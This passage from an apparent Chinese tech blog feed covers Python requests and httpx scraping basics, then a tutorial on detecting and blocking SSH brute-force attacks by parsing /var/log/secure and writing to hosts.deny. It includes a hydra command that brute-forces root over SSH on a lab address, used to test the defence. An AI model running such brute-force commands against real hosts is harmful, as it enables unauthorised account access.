class="hljs-string">    &#x27;</span>User-Agent<span class="hljs-string">&#x27;:&#x27;</span>Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">116.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> Safari/<span class="hljs-number">537.36</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">r = requests.get(url=url,headers=headers)</span><br><span class="hljs-string">with open(&#x27;</span><span class="hljs-number">1.</span>html<span class="hljs-string">&#x27;,&#x27;</span>w<span class="hljs-string">b&#x27;) as f:</span><br><span class="hljs-string">    f.write(r.text.encode(&#x27;</span>utf-<span class="hljs-number">8</span><span class="hljs-string">&#x27;))</span><br><span class="hljs-string">    </span><br><span class="hljs-string">print(r.cookies)</span><br><span class="hljs-string">for k,v in r.cookies.items():</span><br><span class="hljs-string">    print(k + &quot;=&quot; + v)</span><br></code></pre></td></tr></table></figure><h4 id="使用cookiejar保存cookie，并携带cookie访问网页"><a href="#使用cookiejar保存cookie，并携带cookie访问网页" class="headerlink" title="使用cookiejar保存cookie，并携带cookie访问网页"></a>使用cookiejar保存cookie，并携带cookie访问网页</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#！/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests.cookies<br><br>Cookie = <span class="hljs-string">&#x27;xxx&#x27;</span><br><span class="hljs-comment">#创建一个空的RequestsCookieJar来保存cookie</span><br>jar = requests.cookies.RequestsCookieJar()<br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&#x27;</span><br>&#125;<br><br><span class="hljs-comment">#遍历分割cookies字符串，将每一个cookie的键值对添加到cookiejar中</span><br><span class="hljs-keyword">for</span> cookie <span class="hljs-keyword">in</span> Cookie.split(<span class="hljs-string">&#x27;;&#x27;</span>):<br>    key,value = cookie.split(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-number">1</span>)<br>    jar.<span class="hljs-built_in">set</span>(key,value)<br><br><span class="hljs-comment">#发送请求并且附带cookies和header</span><br>r = requests.get(<span class="hljs-string">&#x27;https://www.zhihu.com&#x27;</span>,cookies=jar,headers=headers)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.html&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(r.text.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br></code></pre></td></tr></table></figure><h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><br>r1 = requests.get(<span class="hljs-string">&#x27;http://httpbin.org/cookies/set/number/123456&#x27;</span>)<br><span class="hljs-built_in">print</span>(r1.text)<br>r2 = requests.get(<span class="hljs-string">&#x27;http://httpbin.org/cookies&#x27;</span>)<br><span class="hljs-built_in">print</span>(r2.text)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230912153149172.png" alt="image-20230912153149172"></p><p>存在的问题：每次请求独立 第一次设置了cookie之后第二次请求不存在了</p><p>使用session：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#1.创建一个session</span><br>s = requests.Session()<br><br><span class="hljs-comment">#2.向网站发送get并且设置cookie</span><br>s.get(<span class="hljs-string">&#x27;http://httpbin.org/cookies/set/number/123456&#x27;</span>)<br><br><span class="hljs-comment">#3.再次发送请求 获取会话中的cookie</span><br>r = s.get(<span class="hljs-string">&#x27;http://httpbin.org/cookies&#x27;</span>)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230912153518207.png" alt="image-20230912153518207"></p><h4 id="ssl证书校验"><a href="#ssl证书校验" class="headerlink" title="ssl证书校验"></a>ssl证书校验</h4><p>测试网址：<a href="https://ssr2.scrape.center/">https://ssr2.scrape.center/</a></p><img src="/img/image-20230912153814371.png" alt="image-20230912153814371" style="zoom:67%;" /><p>缺少证书，需要自己点继续前往的情况</p><p>直接请求 报错：</p><p><img src="/img/image-20230912154002903.png" alt="image-20230912154002903"></p><p>添加verify&#x3D;False即可绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">r = requests.get(<span class="hljs-string">&#x27;https://ssr2.scrape.center/&#x27;</span>,verify=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(r.status_code)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230912154243221.png" alt="image-20230912154243221"></p><h4 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h4><p>timeout参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">r = requests.get(<span class="hljs-string">&#x27;https://ssr2.scrape.center/&#x27;</span>,verify=<span class="hljs-literal">False</span>,timeout=<span class="hljs-number">0.1</span>)<br><span class="hljs-built_in">print</span>(r.status_code)<br></code></pre></td></tr></table></figure><h4 id="身份认证（httpbasicAuth）"><a href="#身份认证（httpbasicAuth）" class="headerlink" title="身份认证（httpbasicAuth）"></a>身份认证（httpbasicAuth）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> requests.auth <span class="hljs-keyword">import</span> HTTPBasicAuth<br><span class="hljs-comment">#使用HTTPBasicAuth添加用户密码</span><br>r = requests.get(<span class="hljs-string">&#x27;https://ssr3.scrape.center/&#x27;</span>,verify=<span class="hljs-literal">False</span>,auth=HTTPBasicAuth(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin&#x27;</span>))<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h4 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> weakref <span class="hljs-keyword">import</span> proxy<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment">#http代理</span><br>proxy_list = &#123;<br>    <span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&#x27;http://代理地址:端口&#x27;</span>,<br>    <span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&#x27;http://代理地址:端口&#x27;</span><br>&#125;<br><br>requests.get(<span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>,proxies=proxy_list)<br><br><span class="hljs-comment">#socks代理</span><br>proxies = &#123;<br>    <span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&#x27;sock5:username:password@host:port&#x27;</span><br>&#125;<br>requests.get(<span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>,proxies=proxies)<br></code></pre></td></tr></table></figure><h2 id="httpx"><a href="#httpx" class="headerlink" title="httpx"></a>httpx</h2><p>httpx库  爬取使用http2.0的网站</p><p><a href="https://spa16.scrape.center/">https://spa16.scrape.center/</a></p><p><img src="/img/image-20230929170208257.png" alt="image-20230929170208257"></p><p>支持http2.0还需要安装2.0的支持：</p><p>pip install “httpx[http2]”</p><p>代码中配置：</p><p>client &#x3D; httpx.Client(http2&#x3D;True)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> httpx<br><br>url = <span class="hljs-string">&#x27;https://spa16.scrape.center/&#x27;</span><span class="hljs-comment">#使用http2</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&quot;</span><br>&#125;<br>data = &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;handsome r1&quot;</span><br>&#125;<br>client = httpx.Client(http2=<span class="hljs-literal">True</span>)<br><span class="hljs-comment">#response = client.get(url,headers=headers)</span><br><span class="hljs-comment">#post请求</span><br>response = client.post(<span class="hljs-string">&#x27;https://www.httpbin.org/post&#x27;</span>,headers=headers,data=data)<br><br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ssh暴力破解阻断</title>
    <link href="/2023/09/29/ssh%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E9%98%BB%E6%96%AD/"/>
    <url>/2023/09/29/ssh%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E9%98%BB%E6%96%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="暴力破解的自动阻断"><a href="#暴力破解的自动阻断" class="headerlink" title="暴力破解的自动阻断"></a>暴力破解的自动阻断</h1><p>项目背景：</p><p>只要是暴漏在公网云服务器，每天都会有大量的暴力破解行为</p><p>解决方法：</p><p>1.更换端口（无济于事）<br>2.买云防护，waf （贵）</p><p>爆破破解的一个自动阻断</p><h2 id="re正则表达式"><a href="#re正则表达式" class="headerlink" title="re正则表达式"></a>re正则表达式</h2><h3 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h3><p><strong>findall</strong>  找到匹配到的所有子串，并返回一个列表，如果没有匹配到就返回空</p><p><img src="/img/image-20230905100541279.png" alt="image-20230905100541279"></p><p><strong>search</strong>函数 扫描整个字符串，并且返回第一个，如果没匹配到就返回空</p><p><img src="/img/image-20230905100937856.png" alt="image-20230905100937856"></p><p><strong>匹配元字符</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\d</span>               匹配所有数字<span class="hljs-number">0</span>-<span class="hljs-number">9</span><br><span class="hljs-string">\D</span>               匹配非数字<br><span class="hljs-string">\w</span>               匹配所有单词字符，包括大小写字母 数字 下划线 中文<br><span class="hljs-string">\W</span>               匹配剩下的，空格 换行符 特殊字符<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230905101528009.png" alt="image-20230905101528009"></p><p><strong>匹配字符集</strong></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">字符的集合，用<span class="hljs-comment">[]</span>表示，字符集内用“^”表示“非”<br>\d=<span class="hljs-comment">[0-9]</span><br>\D=<span class="hljs-comment">[ ^ 0-9]</span><br>\w!=<span class="hljs-comment">[a-zA-Z_0-9]</span>??? 还有中文<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230905102515659.png" alt="image-20230905102515659"></p><p><strong>匹配空白字符</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">空白符包含：<br><span class="hljs-string">&#x27; &#x27;</span>空格    <span class="hljs-string">\n换行符</span>   <span class="hljs-string">\t制表符</span>   <span class="hljs-string">\r回车符</span><br>使用<span class="hljs-string">\s来匹配他们</span><br>[^<span class="hljs-string">\s]</span> = <span class="hljs-string">\S</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230905102757945.png" alt="image-20230905102757945"></p><p>**{} **表示匹配标定字符数量</p><p><img src="/img/image-20230905103436862.png" alt="image-20230905103436862"></p><p><strong>特殊数量符号</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">特殊数量符号：<br><span class="hljs-bullet">*              </span>匹配前一个字符0or无限次<br>+              匹配前一个字符1or无限次<br><span class="hljs-bullet">.              </span>匹配除换行符\n意外的任意1个字符<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230905104011139.png" alt="image-20230905104011139"></p><p><strong>字符组</strong><br>把字符用()括起来，叫字符组，目的就为将匹配成的字符串分组</p><p><img src="/img/image-20230905104828290.png" alt="image-20230905104828290"></p><p><strong>匹配参数模式</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">findall方法其实他有第三个参数，他是默认参数，参数模式。<br>re.I         忽略大小写<br>re.S         匹配空白符<br>多个参数用   “<span class="hljs-string">|”</span><br></code></pre></td></tr></table></figure><img src="/img/image-20230905105310566.png" alt="image-20230905105310566" style="zoom:80%;" /><h2 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h2><p><strong>项目需求：执行命令并将输出劫持实现日志的监控</strong></p><p>用于启动新的进程的模块，它可以用于执行外部命令，获取进程的输出，向进程发送输入和等待进程结束。</p><p>多进程协同，python里大概有这么三种方式<br>1.os.system函数<br>阻塞式<br>2.multiprocessing 模块<br>使用场景，密集型的计算</p><p>3.subprocess模块</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">subprocess.run </span>  执行指定的命令，等待命令执行完成后返回一个对象<br><span class="hljs-keyword">subprocess.call</span>执行指定的命令，返回命令执行的状态 （成功为<span class="hljs-number">0</span>  失败为非<span class="hljs-number">0</span>）<br><span class="hljs-keyword">subprocess.check_all</span>与上面类似，区别是会输出报错<br><span class="hljs-keyword">subprocess.getoutput</span>执行命令，返回结果<br></code></pre></td></tr></table></figure><p>参数说明：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">subprocess.<span class="hljs-built_in">run</span>(args, *, <span class="hljs-attribute">stdin</span>=None, <span class="hljs-attribute">input</span>=None, <span class="hljs-attribute">stdout</span>=None, <span class="hljs-attribute">stderr</span>=None, <span class="hljs-attribute">shell</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">timeout</span>=None, <span class="hljs-attribute">check</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">universal_newlines</span>=<span class="hljs-literal">False</span>)<br><br>subprocess.call(args, *, <span class="hljs-attribute">stdin</span>=None, <span class="hljs-attribute">stdout</span>=None, <span class="hljs-attribute">stderr</span>=None, <span class="hljs-attribute">shell</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">timeout</span>=None)<br><br>args：要执行的命令，必须是个字符串，字符串参数列表<br>stdin stdout stderr : 子进程的标准输入 输出 错误 最常用的是subprocess.PIPE<br>timeout : 设置命令超时<br>shell : 值为bool，如果参数为ture 将通过操作系统的shell执行命令<br></code></pre></td></tr></table></figure><img src="/img/image-20230905111931877.png" alt="image-20230905111931877" style="zoom:67%;" /><img src="/img/image-20230905112026716.png" alt="image-20230905112026716" style="zoom:67%;" /><img src="/img/image-20230905112414933.png" alt="image-20230905112414933" style="zoom:67%;" /><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">subprocess.Popen (它是上述几个方法的父类)<br><span class="hljs-built_in">process</span> = subprocess.Popen(<br>cmd,<br><span class="hljs-built_in">shell</span>=True,<br><span class="hljs-keyword">stdout</span> = subprocess.PIPE,<br><span class="hljs-keyword">stdin</span> = subprocess.PIPE,<br><span class="hljs-keyword">stderr</span> = subprocess.PIPE)<br><br><span class="hljs-built_in">shell</span>: 打开终端，Linux中是终端，Windows中是cmd<br><span class="hljs-keyword">stdout</span>=subprocess.PIPE:如果该命令执行成功，那么将该命令的标准输出放入管道<br><br>终端输入命令分两种：<br><span class="hljs-number">1.</span>直接在终端输入<br><span class="hljs-number">2.</span>进入环境再输入，比如python<br></code></pre></td></tr></table></figure><p>在shell中执行命令：</p><p><img src="/img/image-20230905141601763.png" alt="image-20230905141601763"></p><p>在python终端中执行命令：</p><p><img src="/img/image-20230905141623837.png" alt="image-20230905141623837"></p><p>命令联动：</p><p><img src="/img/image-20230905142517181.png" alt="image-20230905142517181"></p><p><img src="/img/image-20230905142454064.png" alt="image-20230905142454064"></p><h2 id="Linux日志分析"><a href="#Linux日志分析" class="headerlink" title="Linux日志分析"></a>Linux日志分析</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/var/</span>log/cron     记录系统的定时任务<br><span class="hljs-regexp">/var/</span>log/cups     打印信息的日志<br><span class="hljs-regexp">/var/</span>log/message    记录的系统重要信息的日志<br><span class="hljs-regexp">/var/</span>log/btmp       登录失败<br><span class="hljs-regexp">/var/</span>log/lastlog     最后一次登录<br><span class="hljs-regexp">/var/</span>log/wtmp      成功登录记录<br><span class="hljs-regexp">/var/</span>log/secure     登录日志<br><span class="hljs-regexp">/var/</span>log/utmp      目前登录用户的信息<br><br>登录成功     Accepted password <span class="hljs-keyword">for</span> root <span class="hljs-keyword">from</span> <span class="hljs-number">172.30</span>.<span class="hljs-number">230.1</span> port <span class="hljs-number">59865</span> ssh2<br>登录失败     Failed password <span class="hljs-keyword">for</span> root <span class="hljs-keyword">from</span> <span class="hljs-number">172.30</span>.<span class="hljs-number">230.1</span> port <span class="hljs-number">59891</span> ssh2<br><br>常用命令：<br><span class="hljs-keyword">find</span>  <span class="hljs-keyword">grep</span>  awk  sed  cat  tail  head<br></code></pre></td></tr></table></figure><p>案例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/passwd从第10行开始显示5行<br><span class="hljs-built_in">cat</span> /etc/passwd | <span class="hljs-built_in">tail</span> -n +10 | <span class="hljs-built_in">head</span> -n 5<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230905145051484.png" alt="image-20230905145051484"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">只显示<span class="hljs-regexp">/etc/</span>passwd的账户名<br>cat <span class="hljs-regexp">/etc/</span>passwd | awk -F <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span><br></code></pre></td></tr></table></figure><img src="/img/image-20230905145301828.png" alt="image-20230905145301828" style="zoom:67%;" /><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">定位有多少个ip在爆破主机的root账户   从<span class="hljs-regexp">/var/</span>log/secure中分析<br>登录失败：<span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Failed password for root&quot;</span> <span class="hljs-regexp">/var/</span>log/secure | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr<br><br>登录成功：<span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Accepted&quot;</span> <span class="hljs-regexp">/var/</span>log/secure | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230905150423999.png" alt="image-20230905150423999"></p><p><img src="/img/image-20230905150508377.png" alt="image-20230905150508377"></p><p><strong>封禁</strong></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">hosts黑名单          /etc/hosts.deny<br>hosts白名单          /etc/hosts.allow<br>配置格式：<br>服务:地址:允许/封禁<br>服务： <br>ssh  ftp  smb  telnet 关键字（all）：禁止或允许运行所有的服务<br>all:<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>:deny(全封)<br>all:<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>:allow(加白)<br><br>地址：<br><span class="hljs-number">192.168.0.10</span><br><span class="hljs-number">192.168.0.10</span>/<span class="hljs-number">24</span>（封C段）<br><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.*（封C段）<br><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>. （封C段）<br></code></pre></td></tr></table></figure><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs diff">密码爆破 hydra<br>hydra -l root -P 密码字典.txt -vV -e ns 10.210.100.131 ssh<br><span class="hljs-deletion">-l 指定用户</span><br><span class="hljs-deletion">-L 指定用户字典</span><br><span class="hljs-deletion">-P 指定密码字典</span><br><span class="hljs-deletion">-vV 显示提示信息</span><br><span class="hljs-deletion">-e ns 允许为空密码</span><br>ip<br>爆破的服务<br></code></pre></td></tr></table></figure><img src="/img/image-20230905152954772.png" alt="image-20230905152954772" style="zoom:67%;" /><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">封禁：<br><span class="hljs-symbol">sshd:</span><span class="hljs-number">10.210</span><span class="hljs-number">.100</span><span class="hljs-number">.128</span>:deny<br></code></pre></td></tr></table></figure><img src="/img/image-20230905153708461.png" alt="image-20230905153708461" style="zoom:67%;" /><p>攻击机无法连接和爆破</p><img src="/img/image-20230905153851379.png" alt="image-20230905153851379" style="zoom:80%;" /><p><img src="/img/image-20230905153939709.png" alt="image-20230905153939709"></p><h2 id="项目实现思路"><a href="#项目实现思路" class="headerlink" title="项目实现思路"></a>项目实现思路</h2><p>1.打开安全日志</p><p>2.实时监控安全日志</p><p>3.解析日志每一行的内容，找出正在爆破的ip</p><p>4.设置一个阈值，超过阈值后，封禁ip 添加到hosts.deny中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment">#安全日志</span><br>logFile = <span class="hljs-string">&#x27;/var/log/secure&#x27;</span><br><span class="hljs-comment">#黑名单</span><br>hostDeny = <span class="hljs-string">&#x27;/etc/hosts.deny&#x27;</span><br><span class="hljs-comment">#封禁阈值</span><br>password_wrong_num = <span class="hljs-number">5</span><br><br><span class="hljs-comment">#获取已经加入黑名单的ip，转换为字典</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getDenies</span>():<br>    deniedDict = &#123;&#125;<br>    <span class="hljs-built_in">list</span> = <span class="hljs-built_in">open</span>(hostDeny).readlines()<br>    <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>        group = re.search(<span class="hljs-string">r&#x27;(\d+\.\d+\.\d+\.\d+)&#x27;</span>,ip)<br>        <span class="hljs-keyword">if</span> group:<br>            deniedDict[group[<span class="hljs-number">1</span>]] = <span class="hljs-string">&#x27;1&#x27;</span>  <span class="hljs-comment">#标记该ip为1</span><br>    <span class="hljs-keyword">return</span> deniedDict<br><br><span class="hljs-comment">#监控方法</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">monitorLog</span>(<span class="hljs-params">Logfile</span>):<br>    <span class="hljs-comment">#统计密码错误的次数</span><br>    tempIp = &#123;&#125;<br>    <span class="hljs-comment">#已经存到黑名单中的ip</span><br>    deniedDict = getDenies()<br>    <span class="hljs-comment">#读取安全日志</span><br>    popen = subprocess.Popen(<span class="hljs-string">&#x27;tail -f &#x27;</span>+logFile,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment">#开始监控</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-comment">#读取日志</span><br>        line = popen.stdout.readline().strip()  <span class="hljs-comment">#str.strip() 去除字符串两边的空格</span><br>        <span class="hljs-keyword">if</span> line:<br>            <span class="hljs-comment">#出现Failed 说明：这个用户存在，但是密码错误</span><br>            <span class="hljs-comment">#出现Invalid 说明：这个用户都不存在</span><br>            group = re.search(<span 